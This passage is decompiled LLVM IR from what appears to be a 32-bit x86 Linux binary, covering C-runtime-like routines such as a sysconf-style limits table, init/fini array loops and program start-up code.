    i32 128, label %dec_label_pc_804f5e8
    i32 129, label %dec_label_pc_804f4e9
    i32 130, label %dec_label_pc_804f4e9
    i32 131, label %dec_label_pc_804f5e8
    i32 149, label %dec_label_pc_804f59c
  ]

dec_label_pc_804f4e9:                             ; preds = %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f4f3:                             ; preds = %dec_label_pc_804f4d4
  %v1_804f4f3 = call i32 @function_804baa4(i32 ptrtoint (i32* @0 to i32))
  %v1_804f4f8 = inttoptr i32 %v1_804f4f3 to i32*
  store i32 22, i32* %v1_804f4f8, align 4
  br label %dec_label_pc_804f5e8

dec_label_pc_804f503:                             ; preds = %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f50d:                             ; preds = %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f517:                             ; preds = %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f521:                             ; preds = %dec_label_pc_804f4d4
  %v0_804f524 = call i32 @function_804fb80()
  br label %dec_label_pc_804f529

dec_label_pc_804f529:                             ; preds = %dec_label_pc_804f4d4, %dec_label_pc_804f521
  br label %dec_label_pc_804f615

dec_label_pc_804f533:                             ; preds = %dec_label_pc_804f4d4
  %v0_804f536 = call i32 @function_804b8e8()
  br label %dec_label_pc_804f53b

dec_label_pc_804f53b:                             ; preds = %dec_label_pc_804f4d4, %dec_label_pc_804f533
  br label %dec_label_pc_804f615

dec_label_pc_804f545:                             ; preds = %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f54f:                             ; preds = %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f559:                             ; preds = %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f563:                             ; preds = %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f56d:                             ; preds = %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f577:                             ; preds = %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f581:                             ; preds = %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f58b:                             ; preds = %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f595:                             ; preds = %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f59c:                             ; preds = %dec_label_pc_804f4d4
  %v5_804f5a2 = call i32 @function_804fae0(i32 1, %timespec* null, i32 149, i32 149)
  %v2_804f5aa = icmp slt i32 %v5_804f5a2, 0
  %v1_804f5ac = icmp eq i1 %v2_804f5aa, false
  br i1 %v1_804f5ac, label %dec_label_pc_804f5be, label %dec_label_pc_804f5e8

dec_label_pc_804f5b0:                             ; preds = %dec_label_pc_804f4d4, %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f5b7:                             ; preds = %dec_label_pc_804f4d4, %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f5be:                             ; preds = %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f59c
  br label %dec_label_pc_804f615

dec_label_pc_804f5c5:                             ; preds = %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f5cc:                             ; preds = %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f5d3:                             ; preds = %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f5da:                             ; preds = %dec_label_pc_804f4d4, %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f5e1:                             ; preds = %dec_label_pc_804f4d4, %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f5e8:                             ; preds = %dec_label_pc_804f59c, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4f3
  br label %dec_label_pc_804f615

dec_label_pc_804f5ed:                             ; preds = %dec_label_pc_804f4d4, %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f5f4:                             ; preds = %dec_label_pc_804f4d4, %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f5fb:                             ; preds = %dec_label_pc_804f4d4, %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f602:                             ; preds = %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f609:                             ; preds = %dec_label_pc_804f4d4, %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f610:                             ; preds = %dec_label_pc_804f4d4, %dec_label_pc_804f4d4, %dec_label_pc_804f4d4
  br label %dec_label_pc_804f615

dec_label_pc_804f615:                             ; preds = %dec_label_pc_804f5be, %dec_label_pc_804f595, %dec_label_pc_804f58b, %dec_label_pc_804f581, %dec_label_pc_804f577, %dec_label_pc_804f56d, %dec_label_pc_804f563, %dec_label_pc_804f559, %dec_label_pc_804f54f, %dec_label_pc_804f545, %dec_label_pc_804f53b, %dec_label_pc_804f529, %dec_label_pc_804f517, %dec_label_pc_804f50d, %dec_label_pc_804f503, %dec_label_pc_804f4e9, %dec_label_pc_804f609, %dec_label_pc_804f602, %dec_label_pc_804f5fb, %dec_label_pc_804f5f4, %dec_label_pc_804f5ed, %dec_label_pc_804f5e1, %dec_label_pc_804f5da, %dec_label_pc_804f5d3, %dec_label_pc_804f5cc, %dec_label_pc_804f5c5, %dec_label_pc_804f5b7, %dec_label_pc_804f5b0, %dec_label_pc_804f5e8, %dec_label_pc_804f610
  %v0_804f618 = phi i32 [ 200112, %dec_label_pc_804f5be ], [ 9, %dec_label_pc_804f595 ], [ 65535, %dec_label_pc_804f58b ], [ -32768, %dec_label_pc_804f581 ], [ -2147483648, %dec_label_pc_804f577 ], [ 8, %dec_label_pc_804f56d ], [ 500, %dec_label_pc_804f563 ], [ 4096, %dec_label_pc_804f559 ], [ 16384, %dec_label_pc_804f54f ], [ 1000, %dec_label_pc_804f545 ], [ 32768, %dec_label_pc_804f53b ], [ 6, %dec_label_pc_804f529 ], [ 65536, %dec_label_pc_804f517 ], [ 100, %dec_label_pc_804f50d ], [ 131072, %dec_label_pc_804f503 ], [ 1, %dec_label_pc_804f4e9 ], [ 255, %dec_label_pc_804f609 ], [ 2048, %dec_label_pc_804f602 ], [ 99, %dec_label_pc_804f5fb ], [ 20, %dec_label_pc_804f5f4 ], [ -128, %dec_label_pc_804f5ed ], [ 1024, %dec_label_pc_804f5e1 ], [ 4, %dec_label_pc_804f5da ], [ 32, %dec_label_pc_804f5d3 ], [ 256, %dec_label_pc_804f5cc ], [ 2147483647, %dec_label_pc_804f5c5 ], [ 16, %dec_label_pc_804f5b7 ], [ 127, %dec_label_pc_804f5b0 ], [ -1, %dec_label_pc_804f5e8 ], [ 32767, %dec_label_pc_804f610 ]
  ret i32 %v0_804f618

; uselistorder directives
  uselistorder i32 32768, { 1, 0, 2 }
  uselistorder i32 -2147483648, { 4, 6, 7, 3, 5, 8, 0, 1, 2 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 124, { 1, 0 }
  uselistorder i32 115, { 1, 0 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 50, { 3, 0, 1, 2 }
  uselistorder i32 30, { 1, 0 }
  uselistorder i32 26, { 1, 0 }
  uselistorder i32 19, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_804f615, { 29, 16, 17, 18, 19, 20, 28, 21, 22, 23, 24, 25, 0, 26, 27, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder label %dec_label_pc_804f5e8, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_804f5be, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804f53b, { 1, 0 }
  uselistorder label %dec_label_pc_804f529, { 1, 0 }
}

define i32 @function_804f61c() local_unnamed_addr {
dec_label_pc_804f61c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f61c = load i32, i32* @ebx, align 4
  store i32 %v0_804f61c, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80560a8.174 to i32), i32 -134570152), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80560a8.174 to i32), i32 -134570152), i32 2), i32 0), label %dec_label_pc_804f630, label %dec_label_pc_804f63d

dec_label_pc_804f630:                             ; preds = %dec_label_pc_804f61c, %dec_label_pc_804f630
  %v1_804f6376 = phi i32 [ %v1_804f637, %dec_label_pc_804f630 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80560a8.174 to i32), i32 -134570152), i32 2), i32 -1), %dec_label_pc_804f61c ]
  store i32 ptrtoint (i32* @global_var_804f637.175 to i32), i32* %stack_var_-16, align 4
  %v5_804f630 = mul i32 %v1_804f6376, 4
  %v6_804f630 = add i32 %v5_804f630, ptrtoint (i32* @global_var_80560a8.174 to i32)
  %v7_804f630 = inttoptr i32 %v6_804f630 to i32*
  %v8_804f630 = load i32, i32* %v7_804f630, align 4
  call void @__pseudo_call(i32 %v8_804f630)
  %v0_804f637.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f637 = add i32 %v0_804f637.pre, -1
  store i32 %v1_804f637, i32* %ebx.global-to-local, align 4
  %v10_804f638 = icmp eq i32 %v0_804f637.pre, 0
  %v1_804f63b = icmp eq i1 %v10_804f638, false
  br i1 %v1_804f63b, label %dec_label_pc_804f630, label %dec_label_pc_804f63d

dec_label_pc_804f63d:                             ; preds = %dec_label_pc_804f630, %dec_label_pc_804f61c
  %v0_804f63d = load i32, i32* @global_var_8058b14.176, align 4
  %v1_804f642 = icmp eq i32 %v0_804f63d, 0
  br i1 %v1_804f642, label %dec_label_pc_804f648, label %dec_label_pc_804f646

dec_label_pc_804f646:                             ; preds = %dec_label_pc_804f63d
  %v0_804f646 = load i32, i32* %stack_var_-16, align 4
  %v1_804f646 = call i32 @unknown_0(i32 %v0_804f646)
  br label %dec_label_pc_804f648

dec_label_pc_804f648:                             ; preds = %dec_label_pc_804f646, %dec_label_pc_804f63d
  %v0_804f648 = load i32, i32* @global_var_8058b18.177, align 8
  %v1_804f64e = icmp eq i32 %v0_804f648, 0
  br i1 %v1_804f64e, label %dec_label_pc_804f657, label %dec_label_pc_804f652

dec_label_pc_804f652:                             ; preds = %dec_label_pc_804f648
  %v2_804f654 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f654, i32* %ebx.global-to-local, align 4
  %v0_804f655 = load i32, i32* %stack_var_-16, align 4
  %v1_804f655 = call i32 @unknown_0(i32 %v0_804f655)
  br label %dec_label_pc_804f657

dec_label_pc_804f657:                             ; preds = %dec_label_pc_804f648, %dec_label_pc_804f652
  %v2_804f657 = load i32, i32* %stack_var_-16, align 4
  %v2_804f658 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f658, i32* @edx, align 4
  ret i32 %v2_804f657

; uselistorder directives
  uselistorder i32 %v1_804f637, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 1, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804f657, { 1, 0 }
  uselistorder label %dec_label_pc_804f630, { 1, 0 }
}

define i32 @function_804f65b(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f65b:
  ret i32 0
}

define i32 @function_804f65e(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f65e:
  %v0_804f65e = load i32, i32* @eax, align 4
  ret i32 %v0_804f65e
}

define i32 @function_804f65f() local_unnamed_addr {
dec_label_pc_804f65f:
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804f65f = load i32, i32* @esi, align 4
  %v0_804f660 = load i32, i32* @eax, align 4
  store i32 %v0_804f660, i32* @esi, align 4
  %v0_804f662 = load i32, i32* @ebx, align 4
  store i32 %v0_804f662, i32* %stack_var_-8, align 4
  %v0_804f663 = load i32, i32* @edx, align 4
  store i32 %v0_804f663, i32* @ebx, align 4
  %v5_804f66b = call i32 @function_804f9e4(i32 %v0_804f660, i32 1, i32 %tmp6, i32 %tmp2)
  %v1_804f673 = add i32 %v5_804f66b, 1
  %v8_804f673 = icmp eq i32 %v1_804f673, 0
  %v1_804f674 = icmp eq i1 %v8_804f673, false
  br i1 %v1_804f674, label %dec_label_pc_804f68f, label %dec_label_pc_804f676

dec_label_pc_804f676:                             ; preds = %dec_label_pc_804f65f
  %v0_804f678 = load i32, i32* @ebx, align 4
  %v5_804f67e = call i32 @function_804fd24(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8054920.178, i32 0, i32 0), i32 %v0_804f678, i32 %v1_804f673)
  %v1_804f686 = load i32, i32* @esi, align 4
  %v12_804f686 = icmp eq i32 %v5_804f67e, %v1_804f686
  br i1 %v12_804f686, label %dec_label_pc_804f68f, label %dec_label_pc_804f68a

dec_label_pc_804f68a:                             ; preds = %dec_label_pc_804f676
  %v0_804f68a = call i32 @function_804ec88()
  br label %dec_label_pc_804f68f

dec_label_pc_804f68f:                             ; preds = %dec_label_pc_804f676, %dec_label_pc_804f65f, %dec_label_pc_804f68a
  %v2_804f68f = load i32, i32* %stack_var_-12, align 4
  %v2_804f690 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f690, i32* @ebx, align 4
  store i32 %v0_804f65f, i32* @esi, align 4
  ret i32 %v2_804f68f

; uselistorder directives
  uselistorder i32 ()* @function_804ec88, { 0, 3, 2, 4, 1 }
  uselistorder label %dec_label_pc_804f68f, { 2, 0, 1 }
}

define i32 @function_804f693() local_unnamed_addr {
dec_label_pc_804f693:
  %v0_804f696 = load i8, i8* @global_var_8058b1c.179, align 4
  %v1_804f696 = icmp eq i8 %v0_804f696, 0
  %v1_804f69d = icmp eq i1 %v1_804f696, false
  br i1 %v1_804f69d, label %dec_label_pc_804f693.dec_label_pc_804f6cf_crit_edge, label %dec_label_pc_804f69f

dec_label_pc_804f693.dec_label_pc_804f6cf_crit_edge: ; preds = %dec_label_pc_804f693
  %v0_804f6d2.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804f6cf

dec_label_pc_804f69f:                             ; preds = %dec_label_pc_804f693
  store i8 1, i8* @global_var_8058b1c.179, align 4
  store i32 4096, i32* @global_var_8058b10.102, align 16
  %v0_804f6ca = call i32 @function_804c1bc()
  br label %dec_label_pc_804f6cf

dec_label_pc_804f6cf:                             ; preds = %dec_label_pc_804f693.dec_label_pc_804f6cf_crit_edge, %dec_label_pc_804f69f
  %v0_804f6d2 = phi i32 [ %v0_804f6d2.pre, %dec_label_pc_804f693.dec_label_pc_804f6cf_crit_edge ], [ %v0_804f6ca, %dec_label_pc_804f69f ]
  ret i32 %v0_804f6d2

; uselistorder directives
  uselistorder i8* @global_var_8058b1c.179, { 1, 0 }
  uselistorder label %dec_label_pc_804f6cf, { 1, 0 }
}

define i32 @function_804f6d3(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_804f6d3:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %v0_804f6d3 = load i32, i32* @ebp, align 4
  store i32 %tmp29, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_8058b08.180, align 8
  store i32 %arg6, i32* @global_var_8058b18.177, align 8
  %v2_804f70a = mul i32 %arg2, 4
  %v3_804f70a = add i32 %tmp29, %v2_804f70a
  %v1_804f70d = add i32 %v3_804f70a, 4
  store i32 %v1_804f70d, i32* @global_var_8058b0c.172, align 4
  %v3_804f716 = load i32, i32* %arg3, align 4
  %v14_804f716 = icmp eq i32 %v1_804f70d, %v3_804f716
  store i32 120, i32* %stack_var_-164, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v1_804f71c = icmp eq i1 %v14_804f716, false
  %v4_804f71c = select i1 %v1_804f71c, i32 %v1_804f70d, i32 %v3_804f70a
  store i32 %v4_804f71c, i32* @global_var_8058b0c.172, align 4
  %v2_804f724 = ptrtoint i32* %stack_var_-136 to i32
  %v3_804f729 = bitcast i32* %stack_var_-136 to i8*
  %v4_804f729 = call i32 @function_804d4e0(i8* %v3_804f729, i32 0, i32 120)
  %v0_804f72e = load i32, i32* @global_var_8058b0c.172, align 4
  br label %dec_label_pc_804f736

dec_label_pc_804f736:                             ; preds = %dec_label_pc_804f736, %dec_label_pc_804f6d3
  %v0_804f736 = phi i32 [ %v1_804f739, %dec_label_pc_804f736 ], [ %v0_804f72e, %dec_label_pc_804f6d3 ]
  %v1_804f736 = inttoptr i32 %v0_804f736 to i32*
  %v2_804f736 = load i32, i32* %v1_804f736, align 4
  %v3_804f736 = icmp eq i32 %v2_804f736, 0
  %v1_804f739 = add i32 %v0_804f736, 4
  %v1_804f73c = icmp eq i1 %v3_804f736, false
  br i1 %v1_804f73c, label %dec_label_pc_804f736, label %dec_label_pc_804f75d.preheader

dec_label_pc_804f75d.preheader:                   ; preds = %dec_label_pc_804f736
  store i32 %v1_804f739, i32* @ebx, align 4
  %v1_804f75d1 = inttoptr i32 %v1_804f739 to i32*
  %v2_804f75d2 = load i32, i32* %v1_804f75d1, align 4
  %v3_804f75d3 = icmp eq i32 %v2_804f75d2, 0
  %v1_804f76010 = icmp eq i1 %v3_804f75d3, false
  br i1 %v1_804f76010, label %dec_label_pc_804f742.lr.ph, label %dec_label_pc_804f762

dec_label_pc_804f742.lr.ph:                       ; preds = %dec_label_pc_804f75d.preheader
  %v3_804f71a = ptrtoint i32* %stack_var_-168 to i32
  %v3_804f74d = add i32 %v3_804f71a, 32
  br label %dec_label_pc_804f742

dec_label_pc_804f742:                             ; preds = %dec_label_pc_804f742.lr.ph, %dec_label_pc_804f75a
  %v1_804f74d = phi i32 [ %v2_804f75d2, %dec_label_pc_804f742.lr.ph ], [ %v2_804f75d, %dec_label_pc_804f75a ]
  %v0_804f74c = phi i32 [ %v1_804f739, %dec_label_pc_804f742.lr.ph ], [ %v1_804f75a, %dec_label_pc_804f75a ]
  %v6_804f747 = icmp ugt i32 %v1_804f74d, 14
  br i1 %v6_804f747, label %dec_label_pc_804f75a, label %dec_label_pc_804f749

dec_label_pc_804f749:                             ; preds = %dec_label_pc_804f742
  store i32 8, i32* %stack_var_-164, align 4
  store i32 %v0_804f74c, i32* %stack_var_-168, align 4
  %v2_804f74d = mul i32 %v1_804f74d, 8
  %v4_804f74d = add i32 %v3_804f74d, %v2_804f74d
  %v3_804f752 = inttoptr i32 %v4_804f74d to i16*
  %v4_804f752 = call i32 @function_804d4b8(i16* %v3_804f752, i32 %v0_804f74c, i32 8)
  %v0_804f75a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804f75a

dec_label_pc_804f75a:                             ; preds = %dec_label_pc_804f742, %dec_label_pc_804f749
  %v0_804f75a = phi i32 [ %v0_804f74c, %dec_label_pc_804f742 ], [ %v0_804f75a.pre, %dec_label_pc_804f749 ]
  %v1_804f75a = add i32 %v0_804f75a, 8
  store i32 %v1_804f75a, i32* @ebx, align 4
  %v1_804f75d = inttoptr i32 %v1_804f75a to i32*
  %v2_804f75d = load i32, i32* %v1_804f75d, align 4
  %v3_804f75d = icmp eq i32 %v2_804f75d, 0
  %v1_804f760 = icmp eq i1 %v3_804f75d, false
  br i1 %v1_804f760, label %dec_label_pc_804f742, label %dec_label_pc_804f762

dec_label_pc_804f762:                             ; preds = %dec_label_pc_804f75a, %dec_label_pc_804f75d.preheader
  store i32 %v2_804f724, i32* @eax, align 4
  %v0_804f766 = call i32 @function_8051678()
  store i32 %v0_804f766, i32* @eax, align 4
  %v0_804f76b = call i32 @function_804f693()
  %v1_804f779 = icmp eq i32 %tmp24, 0
  %v3_804f77b = select i1 %v1_804f779, i32 4096, i32 %tmp24
  %v13_804f77e = icmp eq i32 %tmp23, -1
  store i32 %v3_804f77b, i32* @global_var_8058b10.102, align 16
  %v1_804f788 = icmp eq i1 %v13_804f77e, false
  br i1 %v1_804f788, label %dec_label_pc_804f7b3, label %dec_label_pc_804f78a

dec_label_pc_804f78a:                             ; preds = %dec_label_pc_804f762
  %v0_804f78a = call i32 @function_804fc54()
  store i32 %v0_804f78a, i32* @ebx, align 4
  %v0_804f791 = call i32 @function_804fbd0()
  %v0_804f796 = load i32, i32* @ebx, align 4
  %v12_804f796 = icmp eq i32 %v0_804f796, %v0_804f791
  %v1_804f798 = icmp eq i1 %v12_804f796, false
  br i1 %v1_804f798, label %dec_label_pc_804f7c9, label %dec_label_pc_804f79a

dec_label_pc_804f79a:                             ; preds = %dec_label_pc_804f78a
  %v0_804f79a = call i32 @function_804fbf8()
  store i32 %v0_804f79a, i32* @ebx, align 4
  %v0_804f7a1 = call i32 @function_804fba8()
  %v0_804f7a6 = load i32, i32* @ebx, align 4
  %v12_804f7a6 = icmp eq i32 %v0_804f7a6, %v0_804f7a1
  %v1_804f7a8 = icmp eq i1 %v12_804f7a6, false
  br i1 %v1_804f7a8, label %dec_label_pc_804f7c9, label %dec_label_pc_804f7aa.thread

dec_label_pc_804f7aa.thread:                      ; preds = %dec_label_pc_804f79a
  br label %dec_label_pc_804f7f3

dec_label_pc_804f7b3:                             ; preds = %dec_label_pc_804f762
  %v15_804f7b3 = icmp eq i32 %tmp23, %tmp22
  %v1_804f7b7 = icmp eq i1 %v15_804f7b3, false
  br i1 %v1_804f7b7, label %dec_label_pc_804f7c9, label %dec_label_pc_804f7b9

dec_label_pc_804f7b9:                             ; preds = %dec_label_pc_804f7b3
  br label %dec_label_pc_804f7c9

dec_label_pc_804f7c9:                             ; preds = %dec_label_pc_804f7b9, %dec_label_pc_804f7b3, %dec_label_pc_804f79a, %dec_label_pc_804f78a
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_804f7d0 = call i32 @function_804f65f()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_804f7df = call i32 @function_804f65f()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_804f7ee = call i32 @function_804f65f()
  br label %dec_label_pc_804f7f3

dec_label_pc_804f7f3:                             ; preds = %dec_label_pc_804f7aa.thread, %dec_label_pc_804f7c9
  %v0_804f7f3 = load i32, i32* @edi, align 4
  %v1_804f7f3 = inttoptr i32 %v0_804f7f3 to i32*
  %v2_804f7f3 = load i32, i32* %v1_804f7f3, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80560a8.174 to i32), i32 -134570152), i32 2), i32* %esi.global-to-local, align 4
  store i32 %v2_804f7f3, i32* inttoptr (i32 134571064 to i32*), align 8
  store i32 %arg5, i32* @global_var_8058b14.176, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80560a8.174 to i32), i32 -134570152), i32 2), i32 0), label %dec_label_pc_804f818, label %dec_label_pc_804f824

dec_label_pc_804f818:                             ; preds = %dec_label_pc_804f7f3, %dec_label_pc_804f818
  %v4_804f81849 = phi i32 [ %v1_804f81f, %dec_label_pc_804f818 ], [ 0, %dec_label_pc_804f7f3 ]
  %v5_804f818 = mul i32 %v4_804f81849, 4
  %v6_804f818 = add i32 %v5_804f818, ptrtoint (i32* @global_var_80560a8.174 to i32)
  %v7_804f818 = inttoptr i32 %v6_804f818 to i32*
  %v8_804f818 = load i32, i32* %v7_804f818, align 4
  call void @__pseudo_call(i32 %v8_804f818)
  %v0_804f81f = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f81f = add i32 %v0_804f81f, 1
  store i32 %v1_804f81f, i32* %ebx.global-to-local, align 4
  %v1_804f820 = load i32, i32* %esi.global-to-local, align 4
  %v7_804f820 = icmp ult i32 %v1_804f81f, %v1_804f820
  br i1 %v7_804f820, label %dec_label_pc_804f818, label %dec_label_pc_804f824

dec_label_pc_804f824:                             ; preds = %dec_label_pc_804f818, %dec_label_pc_804f7f3
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80560a8.174 to i32), i32 -134570152), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80560a8.174 to i32), i32 -134570152), i32 2), i32 0), label %dec_label_pc_804f83c, label %dec_label_pc_804f848

dec_label_pc_804f83c:                             ; preds = %dec_label_pc_804f824, %dec_label_pc_804f83c
  %v4_804f83c43 = phi i32 [ %v1_804f843, %dec_label_pc_804f83c ], [ 0, %dec_label_pc_804f824 ]
  store i32 ptrtoint (i32* @global_var_804f843.183 to i32), i32* %stack_var_-164, align 4
  %v5_804f83c = mul i32 %v4_804f83c43, 4
  %v6_804f83c = add i32 %v5_804f83c, ptrtoint (i32* @global_var_80560a8.174 to i32)
  %v7_804f83c = inttoptr i32 %v6_804f83c to i32*
  %v8_804f83c = load i32, i32* %v7_804f83c, align 4
  call void @__pseudo_call(i32 %v8_804f83c)
  %v0_804f843 = load i32, i32* @ebx, align 4
  %v1_804f843 = add i32 %v0_804f843, 1
  store i32 %v1_804f843, i32* @ebx, align 4
  %v1_804f844.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_804f844 = icmp ult i32 %v1_804f843, %v1_804f844.pre
  br i1 %v7_804f844, label %dec_label_pc_804f83c, label %dec_label_pc_804f848

dec_label_pc_804f848:                             ; preds = %dec_label_pc_804f83c, %dec_label_pc_804f824
  %v0_804f851 = load i32, i32* %stack_var_-164, align 4
  %v1_804f851 = call i32 @function_804baa4(i32 %v0_804f851)
  %v1_804f856 = inttoptr i32 %v1_804f851 to i32*
  store i32 0, i32* %v1_804f856, align 4
  %v0_804f865 = call i32 @function_804fe9c()
  store i32 %v0_804f865, i32* @eax, align 4
  %v1_804f86a = inttoptr i32 %v0_804f865 to i32*
  store i32 0, i32* %v1_804f86a, align 4
  %v0_804f870 = load i32, i32* @eax, align 4
